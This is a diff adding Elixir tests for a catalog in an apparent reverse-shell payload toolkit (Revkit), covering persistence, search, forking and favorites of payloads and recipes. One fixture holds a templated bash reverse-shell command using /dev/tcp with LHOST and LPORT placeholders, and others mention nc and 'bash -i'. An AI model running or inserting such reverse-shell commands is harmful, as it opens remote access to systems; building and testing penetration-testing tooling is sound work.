@@ -116,6 +116,52 @@ defmodule Revkit.CatalogTest do
       assert Catalog.list_payloads() == []
       assert Catalog.list_tags() == []
     end
+
+    test "create_payload/1 persists target metadata, notes, and favorite status" do
+      attrs =
+        Map.merge(@payload_attrs, %{
+          target_os: "linux",
+          target_shell: "bash",
+          target_tools: ["base64", "curl"],
+          notes: "Requires an interactive shell",
+          favorite: true
+        })
+
+      assert {:ok, %Payload{} = payload} = Catalog.create_payload(attrs)
+
+      assert payload.target_os == "linux"
+      assert payload.target_shell == "bash"
+      assert payload.target_tools == ["base64", "curl"]
+      assert payload.notes == "Requires an interactive shell"
+      assert payload.favorite == true
+    end
+
+    test "search_payloads/1 matches name, description, and template" do
+      {:ok, _payload} =
+        Catalog.create_payload(%{
+          name: "Alpha shell",
+          description: "interactive",
+          template: "bash -i"
+        })
+
+      {:ok, _payload} =
+        Catalog.create_payload(%{name: "Beta", description: "quiet", template: "nc"})
+
+      assert Enum.map(Catalog.search_payloads("alpha"), & &1.name) == ["Alpha shell"]
+      assert Enum.map(Catalog.search_payloads("interactive"), & &1.name) == ["Alpha shell"]
+      assert Enum.map(Catalog.search_payloads("NC"), & &1.name) == ["Beta"]
+      assert Catalog.search_payloads("missing") == []
+    end
+
+    test "toggle_payload_favorite/1 flips the flag" do
+      {:ok, payload} = Catalog.create_payload(@payload_attrs)
+
+      assert {:ok, favorited} = Catalog.toggle_payload_favorite(payload)
+      assert favorited.favorite == true
+
+      assert {:ok, unfavorited} = Catalog.toggle_payload_favorite(favorited)
+      assert unfavorited.favorite == false
+    end
   end
 
   describe "recipes" do
@@ -136,6 +182,90 @@ defmodule Revkit.CatalogTest do
              ]
 
       assert Catalog.get_recipe!(recipe.id).steps == recipe.steps
+    end
+
+    test "create_recipe/1 stores a full generation snapshot" do
+      attrs = %{
+        name: "Bash snapshot",
+        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
+        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
+        steps: [%{"key" => "base64_encode", "options" => %{}}],
+        notes: "Requires bash",
+        favorite: true,
+        target_os: "linux",
+        target_shell: "bash",
+        target_tools: ["bash"]
+      }
+
+      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(attrs)
+
+      assert recipe.template == attrs.template
+      assert recipe.variables == attrs.variables
+      assert recipe.notes == "Requires bash"
+      assert recipe.favorite == true
+      assert recipe.target_os == "linux"
+      assert recipe.target_shell == "bash"
+      assert recipe.target_tools == ["bash"]
+
+      loaded = Catalog.get_recipe!(recipe.id)
+      assert loaded.template == attrs.template
+      assert loaded.variables == attrs.variables
+    end
+
+    test "fork_recipe/1 copies the snapshot and tags" do
+      {:ok, payload} = Catalog.create_payload(%{name: "Source", template: "id"})
+
+      {:ok, recipe} =
+        Catalog.create_recipe(%{
+          name: "Original",
+          template: "bash -i",
+          variables: %{"LHOST" => "127.0.0.1"},
+          steps: [%{"key" => "bash_wrapper", "options" => %{}}],
+          notes: "note",
+          favorite: true,
+          target_os: "linux",
+          target_shell: "bash",
+          payload_id: payload.id
+        })
+
+      {:ok, _recipe} = Catalog.put_recipe_tag_names(recipe, ["unix"])
+
+      assert {:ok, forked} = Catalog.fork_recipe(Catalog.get_recipe!(recipe.id))
+
+      assert forked.name == "Original (copy)"
+      assert forked.template == "bash -i"
+      assert forked.variables == %{"LHOST" => "127.0.0.1"}
+      assert forked.steps == [%{"key" => "bash_wrapper", "options" => %{}}]
+      assert forked.notes == "note"
+      assert forked.favorite == true
+      assert forked.target_shell == "bash"
+      assert forked.payload_id == payload.id
+      assert Enum.map(forked.tags, & &1.name) == ["unix"]
+    end
+
+    test "search_recipes/1 matches snapshot fields" do
+      {:ok, _recipe} =
+        Catalog.create_recipe(%{
+          name: "Linux shell",
+          template: "bash -i",
+          notes: "interactive"
+        })
+
+      {:ok, _recipe} = Catalog.create_recipe(%{name: "Other", template: "cmd.exe"})
+
+      assert Enum.map(Catalog.search_recipes("linux"), & &1.name) == ["Linux shell"]
+      assert Enum.map(Catalog.search_recipes("interactive"), & &1.name) == ["Linux shell"]
+      assert Enum.map(Catalog.search_recipes("CMD"), & &1.name) == ["Other"]
+    end
+
+    test "toggle_recipe_favorite/1 flips the flag" do
+      {:ok, recipe} = Catalog.create_recipe(%{name: "Recipe"})
+
+      assert {:ok, favorited} = Catalog.toggle_recipe_favorite(recipe)
+      assert favorited.favorite == true
+
+      assert {:ok, unfavorited} = Catalog.toggle_recipe_favorite(favorited)
+      assert unfavorited.favorite == false
     end
 
     test "create_recipe/1 defaults steps to an empty list" do
